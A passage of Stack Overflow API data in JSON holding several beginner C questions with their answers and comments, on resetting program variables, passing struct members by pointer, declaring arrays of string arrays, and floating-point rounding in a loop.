press inside the console, the cursor jumps to it's position.</strong> </p>\n\n<p>I have heard that it can be done with threads. But i really don't know how. I searched a lot on the internet but I never found anything helpful.</p>\n\n<p><strong>Note : I am using GCC compiler (Code Blocks)</strong></p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457529150, "post_id": 35892547, "comment_id": 59445929, "body": "A simple <code>days = 1</code> is not enough?"}, {"owner": {"reputation": 2817, "user_id": 1864317, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/593ff754b31a4e1174a6fd7c6f511a9e?s=128&d=identicon&r=PG", "display_name": "stanm", "link": "https://stackoverflow.com/users/1864317/stanm"}, "edited": false, "score": 0, "creation_date": 1457529274, "post_id": 35892547, "comment_id": 59446030, "body": "You don&#39;t seem to be initializing the stocks array, indicating there is no default. Make an init function which loops over the array and sets the default value, whatever that might be. It should also set the default values for your other variables, like days e.g. Then call that function whenever you want to reset to your default state."}], "answers": [{"comments": [{"owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "reply_to_user": {"reputation": 33, "user_id": 5860316, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1669194306685429/picture?type=large", "display_name": "Star Ice", "link": "https://stackoverflow.com/users/5860316/star-ice"}, "edited": false, "score": 0, "creation_date": 1457529676, "post_id": 35892590, "comment_id": 59446293, "body": "You are welcome @iCe_Star, I will upvote your question since you are new, but make sure you post your attempt as well next time! ;)"}], "tags": [], "owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "is_accepted": true, "score": 1, "last_activity_date": 1457529143, "creation_date": 1457529143, "answer_id": 35892590, "question_id": 35892547, "link": "https://stackoverflow.com/questions/35892547/how-to-reset-my-program-into-default/35892590#35892590", "title": "How to reset my program into default", "body": "<p>If be reset, you mean that the variables should take their initial values, then just do this:</p>\n\n<pre><code>if(choice == 3){\n  choice = 0;\n  days = 1;\n  // i and stocks do not have initial values, maybe nullify them\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 33, "user_id": 5860316, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1669194306685429/picture?type=large", "display_name": "Star Ice", "link": "https://stackoverflow.com/users/5860316/star-ice"}, "edited": false, "score": 0, "creation_date": 1457529525, "post_id": 35892630, "comment_id": 59446208, "body": "thanks for the suggestion about this int stocks[99] = {0};"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 33, "user_id": 5860316, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1669194306685429/picture?type=large", "display_name": "Star Ice", "link": "https://stackoverflow.com/users/5860316/star-ice"}, "edited": false, "score": 0, "creation_date": 1457529559, "post_id": 35892630, "comment_id": 59446224, "body": "@iCe_Star Take also note that day can start from 0."}], "tags": [], "owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "is_accepted": false, "score": 1, "last_activity_date": 1457529288, "creation_date": 1457529288, "answer_id": 35892630, "question_id": 35892547, "link": "https://stackoverflow.com/questions/35892547/how-to-reset-my-program-into-default/35892630#35892630", "title": "How to reset my program into default", "body": "<pre><code>if(choice == 3)\n{\n   days = 1;\n   memset(stocks, 0x00, sizeof(stocks)/sizeof(stocks[0]));\n}\n</code></pre>\n\n<p>Tip: change </p>\n\n<pre><code>int stocks[99];\n</code></pre>\n\n<p>to</p>\n\n<pre><code>int stocks[99] = {0};\n</code></pre>\n\n<p>To ensure all array fields are <code>0</code> at the start of for loop</p>\n\n<p>C99 [$6.7.8/21]</p>\n\n<blockquote>\n  <p>If there are fewer initializers in a brace-enclosed list than there are elements or members of an aggregate, or fewer characters in a string literal used to initialize an array of known size than there are elements in the array, <strong>the remainder of the aggregate shall be initialized implicitly the same as objects that have static storage duration</strong>.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 33, "user_id": 4714868, "user_type": "registered", "profile_image": "https://graph.facebook.com/10203334543958958/picture?type=large", "display_name": "Marouane Er-rouhi", "link": "https://stackoverflow.com/users/4714868/marouane-er-rouhi"}, "is_accepted": false, "score": 0, "last_activity_date": 1457544286, "creation_date": 1457544286, "answer_id": 35898442, "question_id": 35892547, "link": "https://stackoverflow.com/questions/35892547/how-to-reset-my-program-into-default/35898442#35898442", "title": "How to reset my program into default", "body": "<p>To reset the array you can use a simple for loop </p>\n\n<pre><code>for (i=0;i&lt;99;i++)\n    stocks[i]=0;\\\\ this will make sure that all values are rested to 0\n</code></pre>\n\n<p>choice and days can be set to the desired value</p>\n\n<pre><code>choice=0; \\\\ not necessary since the loop will reset and the user will enter a new value\ndays=1; \n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 5860316, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1669194306685429/picture?type=large", "display_name": "Star Ice", "link": "https://stackoverflow.com/users/5860316/star-ice"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 35892590, "answer_count": 3, "score": -2, "last_activity_date": 1457544286, "creation_date": 1457529010, "last_edit_date": 1457529696, "question_id": 35892547, "link": "https://stackoverflow.com/questions/35892547/how-to-reset-my-program-into-default", "title": "How to reset my program into default", "body": "<p>Does anyone have an idea on how to reset program into default,\nshould i need to use loop for it?</p>\n\n<pre><code>int main(){\n\nint choice = 0;\nint days = 1,i;\nint stocks[99];\n\nfor (;;) {\n\n    clrscr();\n    printf(\"Day %d\\n\", days);\n\n    printf(\"1. harvest\\n\");\n    printf(\"2. View Stocks\\n\");\n    printf(\"3. Reset\\n\");\n    printf(\"\\nchoice: \");\n\n    scanf(\"%d\", &amp;choice);\n\n    if (choice == 1){\n\n        clrscr();\n        printf(\"Enter No. of rice harvested: \");\n        scanf(\"%d\", &amp;stocks[days]);\n        days++;\n    }\n\n    if (choice == 2){\n\n        clrscr();\n        printf(\"Day    Stocks\\n\");\n\n        for (i = 1; i &lt; days; i++){\n\n            printf(\"%2d     %4d\\n\", i, stocks[i]);          \n    }\n\n     getch();\n\n    }if(choice == 3){\n\n        // reset\n    }\n}\n\n}\n</code></pre>\n\n<p>for example if i reset my program the days will go back to Day 1 and the Stocks will become empty.</p>\n"}, {"tags": ["c", "function", "struct"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457528470, "post_id": 35892232, "comment_id": 59445444, "body": "Please learn how to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a>, don&#39;t split your program up like you do, don&#39;t retype in the question and introduce other errors or calling other functions. Copy-paste an actua<a href=\"http://stackoverflow.com/help/mcve\">MCVE</a> that actually compiles directly into the question body."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457554851, "post_id": 35892232, "comment_id": 59463939, "body": "the function: <code>struct_values</code> is never called, and is missing a prototype."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457555088, "post_id": 35892232, "comment_id": 59464090, "body": "the parameter passed to <code>calculations_using_struct_values()</code> needs to be a pointer, not the content.   In <code>main()</code> the call to that function is missing the parameter.  This line: <code>i += a;</code> should be: <code>*i += a;</code>  this line: <code>printf(&quot;%d\\n&quot;,i);</code> should be: <code>printf(&quot;%d\\n&quot;, *i);</code>"}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 5771881, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/570e4a884b1d3605938511c4fead3439?s=128&d=identicon&r=PG&f=1", "display_name": "user5771881", "link": "https://stackoverflow.com/users/5771881/user5771881"}, "edited": false, "score": 0, "creation_date": 1457540684, "post_id": 35892292, "comment_id": 59454786, "body": "In my int main() there is an error occurring in the brackets of calculations_using_struct_values();"}, {"owner": {"reputation": 50933, "user_id": 360211, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/3baKW.png?s=128&g=1", "display_name": "weston", "link": "https://stackoverflow.com/users/360211/weston"}, "edited": false, "score": 0, "creation_date": 1457548150, "post_id": 35892292, "comment_id": 59459848, "body": "Well if it&#39;s like main in your question, you need to pass an argument to it."}, {"owner": {"reputation": 97, "user_id": 5771881, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/570e4a884b1d3605938511c4fead3439?s=128&d=identicon&r=PG&f=1", "display_name": "user5771881", "link": "https://stackoverflow.com/users/5771881/user5771881"}, "edited": false, "score": 0, "creation_date": 1457591394, "post_id": 35892292, "comment_id": 59477717, "body": "int main(); //my main prototype ////////////////////////////////////////////////////////////&zwnj;&#8203;////////////////////&zwnj;&#8203;/// void calculations_using_struct_values(struct test *v) { \tint a=5; \tv-&gt;x +=a; \tmain(); } ////////////////////////////////////////////////////////////&zwnj;&#8203;////////////////////&zwnj;&#8203;///////// int main() { \tprintf(&quot;%d\\n&quot;,); \treturn 0; }///////////////////////////////////////////////////////////&zwnj;&#8203;////////////////////&zwnj;&#8203;////////////////////&zwnj;&#8203;//////////////what do I have to write to pass the pointer into my main function"}, {"owner": {"reputation": 97, "user_id": 5771881, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/570e4a884b1d3605938511c4fead3439?s=128&d=identicon&r=PG&f=1", "display_name": "user5771881", "link": "https://stackoverflow.com/users/5771881/user5771881"}, "edited": false, "score": 0, "creation_date": 1457591660, "post_id": 35892292, "comment_id": 59477829, "body": "I used ////// to separate my functions"}, {"owner": {"reputation": 50933, "user_id": 360211, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/3baKW.png?s=128&g=1", "display_name": "weston", "link": "https://stackoverflow.com/users/360211/weston"}, "edited": false, "score": 0, "creation_date": 1457633717, "post_id": 35892292, "comment_id": 59506641, "body": "calculations_using_struct_values(&amp;variable);"}], "tags": [], "owner": {"reputation": 50933, "user_id": 360211, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/3baKW.png?s=128&g=1", "display_name": "weston", "link": "https://stackoverflow.com/users/360211/weston"}, "is_accepted": false, "score": 2, "last_activity_date": 1457531218, "last_edit_date": 1495541729, "creation_date": 1457528272, "answer_id": 35892292, "question_id": 35892232, "link": "https://stackoverflow.com/questions/35892232/passing-a-struct-member-into-functions-in-c/35892292#35892292", "title": "Passing a struct member into functions in C", "body": "<p>Your function can take a pointer to an <code>int</code>.</p>\n\n<pre><code>void calculations_using_struct_values(int *i)\n{\n    int a=5;\n    *i += a;\n}\n</code></pre>\n\n<p>And pass the address of your struct member to the function (<code>&amp;</code>):</p>\n\n<pre><code>void struct_values()\n{\n    //as before\n\n    calculations_using_struct_values(&amp;variable.x);\n}\n</code></pre>\n\n<p>See: <a href=\"https://stackoverflow.com/questions/2229498/passing-by-reference-in-c\">Passing by reference in C</a></p>\n\n<p>Or you could if needed pass the whole struct:</p>\n\n<pre><code>void calculations_using_struct_values(struct test *s)\n{\n    int a=5;\n    s-&gt;x += a;\n}\n</code></pre>\n\n<p>And pass the address of your struct to the function (<code>&amp;</code>):</p>\n\n<pre><code>void struct_values()\n{\n    //as before\n\n    calculations_using_struct_values(&amp;variable);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1727, "user_id": 2014022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b5ab8fa77e562296a1b668005395762?s=128&d=identicon&r=PG", "display_name": "Peter K", "link": "https://stackoverflow.com/users/2014022/peter-k"}, "is_accepted": false, "score": 0, "last_activity_date": 1457601340, "last_edit_date": 1457601340, "creation_date": 1457528325, "answer_id": 35892314, "question_id": 35892232, "link": "https://stackoverflow.com/questions/35892232/passing-a-struct-member-into-functions-in-c/35892314#35892314", "title": "Passing a struct member into functions in C", "body": "<p>If you want to modify value in place, you need to use pointers:</p>\n\n<pre><code>void calculations_using_struct_values(int *i)\n{\n    int a=5;\n    *i += a;\n    printf(\"%d\\n\", *i);\n    return;\n}\n\n...\n    calculations_using_struct_values(&amp;variable.x);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "is_accepted": false, "score": 1, "last_activity_date": 1457529110, "creation_date": 1457529110, "answer_id": 35892580, "question_id": 35892232, "link": "https://stackoverflow.com/questions/35892232/passing-a-struct-member-into-functions-in-c/35892580#35892580", "title": "Passing a struct member into functions in C", "body": "<p>You could have the functions return values rather than void.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct test\n{\n    int x,y,z;\n};\n\nint calculations_using_struct_values(int i)\n{\n    int a=5;\n    i += a;\n    printf(\"%d\\n\",i);\n    return i;\n}\n\nstruct test struct_values()\n{\n    struct test variable;\n\n    variable.x=50;\n    variable.y=100;\n    variable.z=150;\n\n    variable.x = calculations_using_struct_values(variable.x);\n    return variable;\n}\n\nint main( int argc, char *argv[])\n{\n    struct test values;\n\n    values = struct_values();\n    printf(\"%d\\n\",values.x);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5574, "user_id": 536874, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/00yFk.jpg?s=128&g=1", "display_name": "Johannes", "link": "https://stackoverflow.com/users/536874/johannes"}, "is_accepted": false, "score": 0, "last_activity_date": 1457530001, "last_edit_date": 1457530001, "creation_date": 1457529516, "answer_id": 35892717, "question_id": 35892232, "link": "https://stackoverflow.com/questions/35892232/passing-a-struct-member-into-functions-in-c/35892717#35892717", "title": "Passing a struct member into functions in C", "body": "<p>Here is a collection of calls that prints the different consequences of calling.\nNote how address and value behave after passing them to functions and when the functions return. Depending on your compiler references may not be supported since they are not ansi-c.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid AddByValue(int i)\n{\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"Val A\", &amp;i, i);\n    i = i + 1;\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"Val B\", &amp;i, i);\n}\n\nvoid AddByPointer(int *iptr)\n{\n    //note that you copy the pointer itself by value\n    //the value of the pointer is the address of a place in memory\n    //using the asterix the compiler can navigate to that memory address\n    //using the typeinfo the compiler knows what is supposed to be at that place in memory\n    printf(\"%8s: address: 0x%X value: 0x%X\\n\", \"Point A\", &amp;iptr, iptr);\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"Point B\", iptr, *iptr);\n    (*iptr) = (*iptr) + 1;\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"Point C\", iptr, *iptr);\n}\n\nvoid AddByReference(int &amp;i)\n{\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"Ref A\", &amp;i, i);\n    i = i + 1;\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"Ref B\", &amp;i, i);\n}\n\nstruct test\n{\n    int x, y, z;\n};\n\nvoid PrintStrruct(test t)\n{\n    printf(\"%8s: value: %i\\n\", \"test x\", t.x);\n    printf(\"%8s: value: %i\\n\", \"test y\", t.y);\n    printf(\"%8s: value: %i\\n\", \"test z\", t.z);\n}\n\nvoid PassingAStruct(test *testptr)\n{\n    (*testptr).x = 0;\n    testptr-&gt;y = 0;\n    test &amp; ref = *testptr;\n    ref.z = 0;\n}\n\nint main()\n{\n    int i = 1;\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"main A\", &amp;i, i);\n    AddByValue(i);\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"main B\", &amp;i, i);\n    AddByPointer(&amp;i);\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"main C\", &amp;i, i);\n    AddByReference(i);\n    printf(\"%8s: address: 0x%X value: %i\\n\", \"main D\", &amp;i, i);\n\n    printf(\"--- structs ---\\n\");\n    test mytest;\n    PrintStrruct(mytest);\n    PassingAStruct(&amp;mytest);\n    PrintStrruct(mytest);\n    AddByValue(mytest.x);\n    PrintStrruct(mytest);\n    AddByPointer(&amp;mytest.y);\n    PrintStrruct(mytest);\n    AddByReference(mytest.z);\n    PrintStrruct(mytest);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 97, "user_id": 5771881, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/570e4a884b1d3605938511c4fead3439?s=128&d=identicon&r=PG&f=1", "display_name": "user5771881", "link": "https://stackoverflow.com/users/5771881/user5771881"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 927, "favorite_count": 0, "answer_count": 4, "score": 2, "last_activity_date": 1457601340, "creation_date": 1457528144, "question_id": 35892232, "link": "https://stackoverflow.com/questions/35892232/passing-a-struct-member-into-functions-in-c", "title": "Passing a struct member into functions in C", "body": "<p>I'm trying to use one of the members in the struct to pass it through the calculation function(). This function will calculate a new value for my variable. Can you please show me what I have to do to pass my variable into my main function. I also what to keep my three functions. Thanks  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n</code></pre>\n\n<p>My prototype:</p>\n\n<pre><code>void calculations_using_struct_values(int i);\n</code></pre>\n\n<p>My struct:</p>\n\n<pre><code>struct test\n{\n    int x,y,z;\n};\n</code></pre>\n\n<p>My main:</p>\n\n<pre><code>int main()\n{\n    calculations_using_struct_values();\n    return 0;\n}\n</code></pre>\n\n<p>Initializing the values for my variables:</p>\n\n<pre><code>void struct_values()\n{\n    test variable;\n\n    variable.x=50;\n    variable.y=100;\n    variable.z=150;\n\n    calculations_using_struct_values(variable.x);\n    return;\n}\n</code></pre>\n\n<p>I stored my variable.x into i for this function to plus it by 5:</p>\n\n<pre><code>void calculations_using_struct_values(int i)\n{\n    int a=5;\n    i += a;\n    printf(\"%d\\n\",i);\n    return;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 1, "creation_date": 1457528146, "post_id": 35892134, "comment_id": 59445211, "body": "What is &quot;the short notation to declare arrays&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1457531392, "post_id": 35892252, "comment_id": 59447563, "body": "array type has incomplete element type, which means that <code>size</code> is needed here <code>const char *myArray[2][SIZE]</code>."}], "tags": [], "owner": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "is_accepted": true, "score": 1, "last_activity_date": 1457531745, "last_edit_date": 1457531745, "creation_date": 1457528192, "answer_id": 35892252, "question_id": 35892134, "link": "https://stackoverflow.com/questions/35892134/how-can-i-declare-a-c-array-containing-c-arrays/35892252#35892252", "title": "How can I declare a C array containing C arrays?", "body": "<p>Assuming you want a two-dimensional array of character strings:</p>\n\n<pre><code>const char *myArray[][2] = {\n        {\"obj1\", \"obj2\"},        \n        {\"obj1\", \"obj2\"}\n        /* any other elements */\n};\n</code></pre>\n"}], "owner": {"reputation": 55328, "user_id": 257022, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/e6260b6943182933dffdca8d3a4697b6?s=128&d=identicon&r=PG", "display_name": "aneuryzm", "link": "https://stackoverflow.com/users/257022/aneuryzm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "accepted_answer_id": 35892252, "answer_count": 1, "score": -1, "last_activity_date": 1457531745, "creation_date": 1457527963, "question_id": 35892134, "link": "https://stackoverflow.com/questions/35892134/how-can-i-declare-a-c-array-containing-c-arrays", "title": "How can I declare a C array containing C arrays?", "body": "<p>Given the short notation to declare arrays, how do I specify the type of myArray to be arrays?</p>\n\n<pre><code>[] myArray = {   //here [] should be array type\n            {\"obj1, \"obj2\"},        \n            {\"obj1, \"obj2\"}\n}\n</code></pre>\n"}, {"tags": ["c", "for-loop", "compiler-optimization"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1457528531, "post_id": 35892040, "comment_id": 59445488, "body": "Please see <a href=\"http://stackoverflow.com/questions/588004/is-floating-point-math-broken\">Is floating point math broken?</a>"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1457528718, "post_id": 35892040, "comment_id": 59445633, "body": "@WeatherVane Maybe could be used to flag as duplicate."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1457528747, "post_id": 35892040, "comment_id": 59445657, "body": "You accumulate rounding errors because you add a small number which is not exactly representable as a IEEE floating point number (0.01) many times to another float. Additionally you make an exact comparison which is almost always wrong with floating points. The detailed rules how to compute with and compare floating point numbers are difficult (and I don&#39;t know them). You can avoid accumulating rounding errors by obtaining the steps through multiplication: <code>for(int=0; i&lt;101; i++) { printf(&quot;Iteration %lg\\n&quot;, i*0.01);</code>. Comparisons usually involve FLT_EPSILON from <code>float.h</code>."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1457529185, "post_id": 35892040, "comment_id": 59445959, "body": "As a comparison, you could try to add (1.0/128) 128 times..."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1457529258, "post_id": 35892040, "comment_id": 59446013, "body": "Another thing: Don&#39;t call floats <code>i</code>. Just don&#39;t ;-)."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1457529883, "post_id": 35892040, "comment_id": 59446465, "body": "Thinking in decimal: what happens if you add one third (0.333333~) 3 times? You don&#39;t get <code>1.0</code>. One hundredth is exactly representable in decimal (by definition) but one third is not."}, {"owner": {"reputation": 3126, "user_id": 859453, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/b1238bfa1241c414bc0f411984c89487?s=128&d=identicon&r=PG", "display_name": "Kyrol", "link": "https://stackoverflow.com/users/859453/kyrol"}, "reply_to_user": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1457539606, "post_id": 35892040, "comment_id": 59454020, "body": "@PeterA.Schneider I find it in an example. I never do it ;)"}], "answers": [{"comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1457528659, "post_id": 35892091, "comment_id": 59445587, "body": "I think OP is asking why sum 0.01 to 0 many times gives X.XXX13 at the end of iterations."}, {"owner": {"reputation": 5488, "user_id": 3015734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/31ccee0370328a7c894902c0a70373f7?s=128&d=identicon&r=PG", "display_name": "Tgsmith61591", "link": "https://stackoverflow.com/users/3015734/tgsmith61591"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457528761, "post_id": 35892091, "comment_id": 59445668, "body": "I don&#39;t think that necessarily warranted the downvote, but I edited."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457528863, "post_id": 35892091, "comment_id": 59445734, "body": "I&#39;m not the downvoter. Well done, about the edit."}], "tags": [], "owner": {"reputation": 5488, "user_id": 3015734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/31ccee0370328a7c894902c0a70373f7?s=128&d=identicon&r=PG", "display_name": "Tgsmith61591", "link": "https://stackoverflow.com/users/3015734/tgsmith61591"}, "is_accepted": false, "score": 0, "last_activity_date": 1457528720, "last_edit_date": 1495540228, "creation_date": 1457527848, "answer_id": 35892091, "question_id": 35892040, "link": "https://stackoverflow.com/questions/35892040/loop-cannot-reach-the-limit/35892091#35892091", "title": "Loop cannot reach the limit", "body": "<p>In the last iteration, you see <code>Iteration 9.99013</code> because if the loop iterated again, <code>i</code> would equal 10.00013, which is greater than 10, your looping condition. The <code>for</code> loop only continues as long as the condition is satisfied.</p>\n\n<p>As @WeatherVane pointed out, you should take a look at <a href=\"https://stackoverflow.com/questions/588004/is-floating-point-math-broken\">this question</a>, which explains why you see the additional 0.00013 at the end of your <code>i</code> variable.</p>\n"}, {"tags": [], "owner": {"reputation": 3138, "user_id": 5726600, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WtVNL.jpg?s=128&g=1", "display_name": "Abhishek", "link": "https://stackoverflow.com/users/5726600/abhishek"}, "is_accepted": false, "score": 0, "last_activity_date": 1457528205, "creation_date": 1457528205, "answer_id": 35892258, "question_id": 35892040, "link": "https://stackoverflow.com/questions/35892040/loop-cannot-reach-the-limit/35892258#35892258", "title": "Loop cannot reach the limit", "body": "<blockquote>\n  <p>10.00013 &lt;= 10 condition false so control goes out of for loop</p>\n</blockquote>\n"}], "owner": {"reputation": 3126, "user_id": 859453, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/b1238bfa1241c414bc0f411984c89487?s=128&d=identicon&r=PG", "display_name": "Kyrol", "link": "https://stackoverflow.com/users/859453/kyrol"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "closed_date": 1457537989, "answer_count": 2, "score": 0, "last_activity_date": 1457528720, "creation_date": 1457527710, "question_id": 35892040, "link": "https://stackoverflow.com/questions/35892040/loop-cannot-reach-the-limit", "closed_reason": 